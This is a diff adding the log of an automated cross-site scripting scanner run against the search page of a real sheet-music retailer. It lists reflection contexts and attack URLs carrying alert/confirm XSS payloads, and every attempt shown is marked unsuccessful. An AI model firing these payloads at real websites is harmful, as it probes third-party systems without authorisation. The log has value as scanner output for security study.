@@ -1,0 +1,112 @@
+https://www.jwpepper.com/sheet-music/services-privacy.jsp
+
+GET Params:[2]
+['keywords', None]
+_______________________________________________________________________________________________________
+https://www.jwpepper.com/sheet-music/search.jsp?keywords=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [4]
+<title>Search (uvw"xyz'yxz</zxy | Sheet music at JW Pepper</title>
+<div id="omni-keywords" style="display: none;">(uvw"xyz'yxz</zxy</div>
+<div id="omni-pagetitle" style="display: none;">Search (uvw"xyz'yxz</zxy</div>
+<span class="search-keywords">(uvw"xyz'yxz</zxy</span>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script type="text/javascript">
+				var searchkeywords = "(uvw"xyz'yxz</zxy";
+				var searchresultscount = 0;
+				if (searchresultscount == 0) {
+					ga('send', 'event', 'search', searchkeywords, '0');
+				}
+			</script>
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+HTML:		True	False	False	False	False
+
+Attack Payloads for HTML
+['<img src=x onerror="alert(1)">']
+
+HTML Attack Url: https://www.jwpepper.com/sheet-music/search.jsp?keywords=<img src=x onerror="alert(1)">
+
+ ______ UnSuccessful with payload: <img src=x onerror="alert(1)">
+
+ENCODING     Presence	"	'	<	( 
+HTML:		True	False	False	False	False
+
+Attack Payloads for HTML
+['<img src=x onerror="alert(1)">']
+
+HTML Attack Url: https://www.jwpepper.com/sheet-music/search.jsp?keywords=<img src=x onerror="alert(1)">
+
+ ______ UnSuccessful with payload: <img src=x onerror="alert(1)">
+
+ENCODING     Presence	"	'	<	( 
+HTML:		True	False	False	False	False
+
+Attack Payloads for HTML
+['<img src=x onerror="alert(1)">']
+
+HTML Attack Url: https://www.jwpepper.com/sheet-music/search.jsp?keywords=<img src=x onerror="alert(1)">
+
+ ______ UnSuccessful with payload: <img src=x onerror="alert(1)">
+
+ENCODING     Presence	"	'	<	( 
+HTML:		True	False	False	False	False
+
+Attack Payloads for HTML
+['<img src=x onerror="alert(1)">']
+
+HTML Attack Url: https://www.jwpepper.com/sheet-music/search.jsp?keywords=<img src=x onerror="alert(1)">
+
+ ______ UnSuccessful with payload: <img src=x onerror="alert(1)">
+
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	False	True	False	False
+
+Attack Payloads for SCRIPT
+['"; confirm(1); "', '</script><script>alert(1)</script>']
+
+SCRIPT Attack Url: https://www.jwpepper.com/sheet-music/search.jsp?keywords="; confirm(1); "
+
+ ______ UnSuccessful with payload: "; confirm(1); "
+
+
+SCRIPT Attack Url: https://www.jwpepper.com/sheet-music/search.jsp?keywords=</script><script>alert(1)</script>
+
+ ______ UnSuccessful with payload: </script><script>alert(1)</script>
+
+_______________________________________________________________________________________________________
+https://www.jwpepper.com/sheet-music/search.jsp?keywords=
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [1]
+<a href="/sheet-music/search.jsp?keywords=&pageview=list-view&brandNames=XYZ Music (Holland)">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
